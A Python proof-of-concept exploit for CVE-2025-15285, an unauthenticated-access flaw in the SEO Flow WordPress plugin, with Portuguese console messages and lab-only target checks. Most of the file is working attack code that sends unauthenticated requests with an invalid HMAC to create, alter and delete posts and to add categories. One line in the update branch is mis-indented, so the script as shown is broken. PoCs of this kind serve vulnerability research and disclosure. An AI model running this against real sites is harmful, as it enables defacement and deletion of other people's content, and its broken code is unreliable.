#!/usr/bin/env python3
"""
CVE-2025-15285 — interactive LAB PoC
SEO Flow by LupsOnline <= 2.2.1

Demonstrates, one action at a time:
  1. Unauthenticated post creation
  2. Unauthenticated post modification
  3. Unauthenticated post deletion
  4. Unauthenticated category creation

Safety design:
  - single target only
  - refuses public Internet targets
  - accepts localhost, RFC1918/private IPs, and reserved lab names such as *.test
  - no scanning
  - no credential guessing
  - every state-changing action requires an interactive confirmation
  - modifies/deletes only the post created by this run
"""

from __future__ import annotations

import ipaddress
import json
import re
import sys
import webbrowser
from datetime import datetime
from typing import Optional
from urllib.parse import urljoin, urlparse

import requests
import typer
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

app = typer.Typer(
    add_completion=False,
    no_args_is_help=True,
    help="Interactive LAB PoC for CVE-2025-15285.",
)
console = Console(color_system="truecolor")

BLUE = "#0000ff"
RED = "#ff0000"
DIM = "#777777"
WHITE = "#e6e6e6"

BLOG_PATH = "/wp-json/lupsonlinelinknetwerk/blog"
CATEGORY_PATH = "/wp-json/lupsonlinelinknetwerk/category"

# Syntactically valid for /^[a-z0-9]+$/, but deliberately not the real HMAC.
INVALID_HASH = "deadbeef"

HEADERS = {
    "User-Agent": "CVE-2025-15285-lab-poc/2.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
}


def _slashes(width: int = 76, offset: int = 0) -> Text:
    chars = [" "] * width
    for base in range(-6, width, 9):
        for i in range(4):
            pos = base + i * 2 + offset
            if 0 <= pos < width:
                chars[pos] = "█"
            if 0 <= pos + 1 < width:
                chars[pos + 1] = "█"
    return Text("".join(chars), style=BLUE)


def banner() -> None:
    console.print(_slashes(offset=0))
    console.print(_slashes(offset=3))

    body = Text()
    body.append("        CVE-2025-15285\n", style=f"bold {RED}")
    body.append("SEO Flow <= 2.2.1  •  Missing Authorization\n", style=WHITE)
    body.append(
        "interactive LAB PoC • invalid HMAC • manual action control",
        style=DIM,
    )
    console.print(Panel(body, border_style=RED, padding=(1, 2)))

    console.print(_slashes(offset=6))
    console.print()


def normalize_target(target: str) -> str:
    target = target.strip()
    if not re.match(r"^https?://", target, flags=re.I):
        target = "http://" + target
    return target.rstrip("/")


def is_lab_host(hostname: str) -> bool:
    host = (hostname or "").strip("[]").lower()

    if host in {"localhost", "localhost.localdomain"}:
        return True

    # Reserved/local names useful for LocalWP/Laragon/VM labs.
    if host.endswith((".test", ".localhost", ".local")):
        return True

    try:
        ip = ipaddress.ip_address(host)
        return (
            ip.is_private
            or ip.is_loopback
            or ip.is_link_local
        )
    except ValueError:
        return False


def require_lab_target(target: str) -> str:
    target = normalize_target(target)
    parsed = urlparse(target)

    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        console.print(f"[{RED}]−[/{RED}] Target URL inválido.")
        raise typer.Exit(2)

    if not is_lab_host(parsed.hostname):
        console.print(
            Panel(
                "Este PoC interativo é limitado a laboratório.\n\n"
                "Use localhost, um IP privado (10/8, 172.16/12, 192.168/16), "
                "loopback, ou um domínio reservado como svg.test.",
                title="Public target blocked",
                border_style=RED,
            )
        )
        raise typer.Exit(2)

    return target


def make_url(target: str, path: str) -> str:
    return urljoin(target + "/", path.lstrip("/"))


def post_payload(title: str, content: str, category_id: str = "1") -> dict:
    slug = re.sub(r"[^a-z0-9]+", "-", title.lower()).strip("-")
    return {
        "title": title,
        "slug": slug,
        "content": content,
        "categoryId": category_id,
        "postDate": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "featuredImage": "",
        "hash": INVALID_HASH,
    }


def request_json(
    method: str,
    url: str,
    body: dict,
    *,
    proxy: Optional[str],
    timeout: float,
    verify_tls: bool,
) -> requests.Response:
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # requests.request() is used instead of a persistent Session so cookies
    # returned by one request are not automatically sent on later requests.
    return requests.request(
        method,
        url,
        headers=HEADERS,
        json=body,
        proxies=proxies,
        timeout=timeout,
        verify=verify_tls,
        allow_redirects=False,
    )


def response_json(resp: requests.Response):
    try:
        return resp.json()
    except ValueError:
        return None


def result_table(rows: list[tuple[str, str]]) -> None:
    table = Table(show_header=False, border_style=BLUE)
    table.add_column("Campo", style="bold")
    table.add_column("Valor")
    for key, value in rows:
        table.add_row(key, value)
    console.print(table)


def show_request(method: str, url: str, body: dict) -> None:
    console.print(f"[{BLUE}]*[/{BLUE}] Method   {method}")
    console.print(f"[{BLUE}]*[/{BLUE}] Endpoint {url}")
    console.print(f"[{BLUE}]*[/{BLUE}] Cookie   <none>")
    console.print(f"[{BLUE}]*[/{BLUE}] Auth     <none>")
    console.print(f"[{BLUE}]*[/{BLUE}] Nonce    <none>")
    console.print(f"[{BLUE}]*[/{BLUE}] HMAC     {INVALID_HASH} (intentionally invalid)")
    console.print(
        Panel(
            json.dumps(body, indent=2, ensure_ascii=False),
            title="JSON body",
            border_style=BLUE,
        )
    )


def show_response(resp: requests.Response, limit: int = 1600) -> None:
    data = response_json(resp)
    if data is not None:
        text = json.dumps(data, indent=2, ensure_ascii=False)
    else:
        text = resp.text or "<empty>"
    console.print(
        Panel(
            text[:limit],
            title=f"HTTP {resp.status_code}",
            border_style=BLUE if 200 <= resp.status_code < 300 else RED,
        )
    )


def confirm_action(label: str) -> bool:
    return typer.confirm(label, default=False)


@app.command()
def info() -> None:
    """Explain the vulnerable execution paths."""
    banner()
    flow = (
        "POST /blog      → addBlog()      → checkBlogAuthentication() → WP_Error ignored → wp_insert_post()\n"
        "PUT /blog       → changeBlog()   → checkBlogAuthentication() → WP_Error ignored → wp_update_post()\n"
        "DELETE /blog    → deleteBlog()   → checkBlogAuthentication() → WP_Error ignored → wp_delete_post()\n"
        "POST /category  → addCategory()  → checkCategoryAuthentication() → WP_Error ignored → wp_insert_term()"
    )
    console.print(Panel(flow, title="CVE-2025-15285 paths", border_style=RED))


@app.command("dry-run")
def dry_run(
    target: str = typer.Argument(..., help="Lab target, e.g. http://svg.test"),
) -> None:
    """Show the create-post request without sending it."""
    banner()
    target = require_lab_target(target)
    marker = datetime.now().strftime("%Y%m%d-%H%M%S")
    body = post_payload(
        f"CVE 2025 15285 PoC {marker}",
        f"CVE-2025-15285 lab marker {marker}",
    )
    show_request("POST", make_url(target, BLOG_PATH), body)
    console.print(f"[{RED}]![/{RED}] Dry-run: nenhuma requisição foi enviada.")


@app.command("interactive")
def interactive(
    target: str = typer.Argument(..., help="Lab WordPress target, e.g. http://svg.test"),
    category_id: str = typer.Option("1", "--category-id", help="Category ID used by the test post."),
    insecure: bool = typer.Option(
        False,
        "--insecure",
        help="Disable TLS certificate verification for a local HTTPS lab.",
    ),
    proxy: Optional[str] = typer.Option(
        None,
        "--proxy",
        help="HTTP(S) proxy, e.g. http://127.0.0.1:8080 for Burp.",
    ),
    timeout: float = typer.Option(12.0, "--timeout", min=1.0, max=120.0),
) -> None:
    """
    Create one PoC post, then let you manually choose when to update/delete it
    or create a PoC category.
    """
    banner()
    target = require_lab_target(target)
    blog_url = make_url(target, BLOG_PATH)
    category_url = make_url(target, CATEGORY_PATH)
    verify_tls = not insecure

    marker = datetime.now().strftime("%Y%m%d-%H%M%S")
    current_title = f"CVE 2025 15285 PoC {marker}"
    current_content = (
        "CVE-2025-15285 laboratory post. "
        "Created with a deliberately invalid HMAC."
    )

    created_post_id: Optional[int] = None
    created_page_url: Optional[str] = None
    category_names: list[str] = []
    post_deleted = False

    console.print(
        Panel(
            f"Target: {target}\n"
            f"Blog endpoint: {blog_url}\n"
            f"Category endpoint: {category_url}\n"
            f"Invalid HMAC: {INVALID_HASH}\n\n"
            "Nenhuma sessão WordPress, Cookie, Authorization ou X-WP-Nonce será enviada.",
            title="Lab target",
            border_style=BLUE,
        )
    )

    # STEP 1 — CREATE POST
    console.rule(Text("CASE 1 — CREATE POST", style=RED))
    create_body = post_payload(current_title, current_content, category_id)
    show_request("POST", blog_url, create_body)

    if not confirm_action("Enviar a requisição e criar o post de teste?"):
        console.print(f"[{RED}]![/{RED}] Cancelado antes de qualquer alteração.")
        raise typer.Exit(0)

    try:
        resp = request_json(
            "POST",
            blog_url,
            create_body,
            proxy=proxy,
            timeout=timeout,
            verify_tls=verify_tls,
        )
    except requests.RequestException as exc:
        console.print(f"[{RED}]−[/{RED}] Erro de rede: {exc}")
        raise typer.Exit(3)

    show_response(resp)
    data = response_json(resp)

    if not (200 <= resp.status_code < 300 and isinstance(data, dict)):
        console.print(f"[{RED}]−[/{RED}] Criação do post não foi confirmada.")
        raise typer.Exit(2)

    try:
        created_post_id = int(data.get("pageId"))
    except (TypeError, ValueError):
        created_post_id = None

    created_page_url = data.get("pageUrl") if isinstance(data.get("pageUrl"), str) else None

    if not created_post_id:
        console.print(f"[{RED}]−[/{RED}] A resposta não retornou pageId.")
        raise typer.Exit(2)

    console.print(f"[{RED}]+[/{RED}] Post criado mesmo com HMAC deliberadamente inválido.")
    result_table(
        [
            ("Post ID", str(created_post_id)),
            ("Page URL", created_page_url or "<not returned>"),
            ("WordPress auth", "No"),
            ("HMAC valid", "No"),
        ]
    )

    if created_page_url:
        console.print(
            f"\n[{BLUE}]*[/{BLUE}] Abra e confira o resultado: "
            f"[link={created_page_url}]{created_page_url}[/link]"
        )
        if typer.confirm("Abrir a página no navegador agora?", default=True):
            webbrowser.open(created_page_url)

    console.print(
        "\nAgora o script NÃO fará update/delete automaticamente. "
        "Você escolhe cada caso no menu."
    )

    # INTERACTIVE MENU
    while True:
        console.print()
        console.rule(Text("CVE CASE MENU", style=RED))

        status = "DELETED" if post_deleted else f"ACTIVE (ID {created_post_id})"
        result_table(
            [
                ("PoC post", status),
                ("Categories created", str(len(category_names))),
            ]
        )

        console.print(
            f"[{RED}]1[/{RED}]  Modificar o post criado   (PUT /blog)\n"
            f"[{RED}]2[/{RED}]  Excluir o post criado     (DELETE /blog)\n"
            f"[{RED}]3[/{RED}]  Criar categoria de teste  (POST /category)\n"
            f"[{BLUE}]4[/{BLUE}]  Abrir/reabrir a página criada\n"
            f"[{BLUE}]5[/{BLUE}]  Mostrar resumo técnico dos 4 casos\n"
            f"[{WHITE}]0[/{WHITE}]  Sair"
        )

        choice = typer.prompt("Escolha", default="0").strip().lower()

        # CASE 2 — UPDATE
        if choice == "1":
            if post_deleted:
                console.print(f"[{RED}]−[/{RED}] O post desta execução já foi excluído.")
                continue

            console.rule(Text("CASE 2 — MODIFY POST", style=RED))
            new_title = typer.prompt(
                "Novo título",
                default=f"CVE 2025 15285 Modified {marker}",
            )
            new_content = typer.prompt(
                "Novo conteúdo",
                default="Post modified without a valid HMAC in the authorized laboratory.",
            )

            update_body = post_payload(new_title, new_content, category_id)
            update_body["pageid"] = created_post_id
            show_request("PUT", blog_url, update_body)

            if not confirm_action(f"Modificar somente o post PoC ID {created_post_id}?"):
                console.print(f"[{BLUE}]*[/{BLUE}] Update cancelado.")
                continue

            try:
                resp = request_json(
                    "PUT",
                    blog_url,
                    update_body,
                    proxy=proxy,
                    timeout=timeout,
                    verify_tls=verify_tls,
                )
            except requests.RequestException as exc:
                console.print(f"[{RED}]−[/{RED}] Erro de rede: {exc}")
                continue

            show_response(resp)
            data = response_json(resp)

            if (
                200 <= resp.status_code < 300
                and isinstance(data, dict)
                and str(data.get("pageId")) == str(created_post_id)
            ):
                current_title = new_title
                current_content = new_content
                if isinstance(data.get("pageUrl"), str):
              created_page_url = data["pageUrl"]
                console.print(
                    f"[{RED}]+[/{RED}] CASE 2 confirmado: "
                    "post modificado com HMAC inválido."
                )
                if created_page_url:
                    console.print(
                        f"[{BLUE}]*[/{BLUE}] Confira: "
                        f"[link={created_page_url}]{created_page_url}[/link]"
                    )
            else:
                console.print(f"[{RED}]−[/{RED}] Update não foi confirmado.")

        # CASE 3 — DELETE
        elif choice == "2":
            if post_deleted:
                console.print(f"[{RED}]−[/{RED}] O post desta execução já foi excluído.")
                continue

            console.rule(Text("CASE 3 — DELETE POST", style=RED))
            delete_body = {
                "pageid": str(created_post_id),
                "title": current_title,
                "hash": INVALID_HASH,
            }
            show_request("DELETE", blog_url, delete_body)

            if not confirm_action(
                f"Excluir SOMENTE o post PoC ID {created_post_id}? Esta ação é destrutiva."
            ):
                console.print(f"[{BLUE}]*[/{BLUE}] Delete cancelado.")
                continue

            try:
                resp = request_json(
                    "DELETE",
                    blog_url,
                    delete_body,
                    proxy=proxy,
                    timeout=timeout,
                    verify_tls=verify_tls,
                )
            except requests.RequestException as exc:
                console.print(f"[{RED}]−[/{RED}] Erro de rede: {exc}")
                continue

            show_response(resp)

            if 200 <= resp.status_code < 300:
                post_deleted = True
                console.print(
                    f"[{RED}]+[/{RED}] CASE 3 enviado/aceito: "
                    "wp_delete_post() pode ser alcançado com HMAC inválido."
                )
                console.print(
                    f"[{BLUE}]*[/{BLUE}] Reabra a URL anterior para confirmar "
                    "o efeito persistente."
                )
            else:
                console.print(f"[{RED}]−[/{RED}] Delete não foi confirmado.")

        # CASE 4 — CREATE CATEGORY
        elif choice == "3":
            console.rule(Text("CASE 4 — CREATE CATEGORY", style=RED))
            default_name = f"CVE-2025-15285-{marker}-{len(category_names) + 1}"
            category_name = typer.prompt("Nome da categoria de teste", default=default_name)
            parent_id = typer.prompt("Parent ID", default="0")

            try:
                parent_id_int = int(parent_id)
            except ValueError:
                console.print(f"[{RED}]−[/{RED}] Parent ID precisa ser inteiro.")
                continue

            category_body = {
                "category": category_name,
                "parentId": parent_id_int,
                "hash": INVALID_HASH,
            }
            show_request("POST", category_url, category_body)

            if not confirm_action("Criar esta categoria no laboratório?"):
                console.print(f"[{BLUE}]*[/{BLUE}] Criação de categoria cancelada.")
                continue

            try:
                resp = request_json(
                    "POST",
                    category_url,
                    category_body,
                    proxy=proxy,
                    timeout=timeout,
                    verify_tls=verify_tls,
                )
            except requests.RequestException as exc:
                console.print(f"[{RED}]−[/{RED}] Erro de rede: {exc}")
                continue

            show_response(resp)
            data = response_json(resp)

            if 200 <= resp.status_code < 300:
                category_names.append(category_name)
                console.print(
                    f"[{RED}]+[/{RED}] CASE 4 confirmado/aceito: "
                    f"categoria '{category_name}' criada com HMAC inválido."
                )
                console.print(
                    f"[{BLUE}]*[/{BLUE}] A CVE não fornece endpoint vulnerável de "
                    "remoção de categoria; remova esta categoria manualmente pelo "
                    "wp-admin quando terminar o laboratório."
                )
            else:
                console.print(f"[{RED}]−[/{RED}] Criação da categoria não foi confirmada.")

        elif choice == "4":
            if not created_page_url:
                console.print(f"[{RED}]−[/{RED}] Nenhuma URL de página foi retornada.")
            else:
                console.print(
                    f"[link={created_page_url}]{created_page_url}[/link]"
                )
                webbrowser.open(created_page_url)

        elif choice == "5":
            console.print(
                Panel(
                    "CASE 1 — POST /blog\n"
                    "  addBlog() → checkBlogAuthentication() → erro ignorado → wp_insert_post()\n\n"
                    "CASE 2 — PUT /blog\n"
                    "  changeBlog() → checkBlogAuthentication() → erro ignorado → wp_update_post()\n\n"
                    "CASE 3 — DELETE /blog\n"
                    "  deleteBlog() → checkBlogAuthentication() → erro ignorado → wp_delete_post()\n\n"
                    "CASE 4 — POST /category\n"
                    "  addCategory() → checkCategoryAuthentication() → erro ignorado → wp_insert_term()",
                    title="CVE-2025-15285 — all affected cases",
                    border_style=RED,
                )
            )

        elif choice in {"0", "q", "quit", "exit"}:
            console.print()
            if not post_deleted:
                console.print(
                    f"[{RED}]![/{RED}] O post PoC ID {created_post_id} ainda existe. "
                    "Escolha a opção 2 antes de sair se quiser removê-lo."
                )
                if not typer.confirm("Sair mesmo assim?", default=False):
                    continue

            if category_names:
                console.print(
                    f"[{BLUE}]*[/{BLUE}] Categorias criadas nesta execução "
                    "(remova manualmente no wp-admin):"
                )
                for name in category_names:
                    console.print(f"    • {name}")

            console.print(
                Panel(
                    "Fim da sessão de laboratório.\n"
                    "A demonstração usa um HMAC sintaticamente válido porém incorreto "
                    "e nenhuma autenticação WordPress.",
                    title="Finished",
                    border_style=BLUE,
                )
            )
            break

        else:
            console.print(f"[{RED}]−[/{RED}] Opção inválida.")


if __name__ == "__main__":
    app()
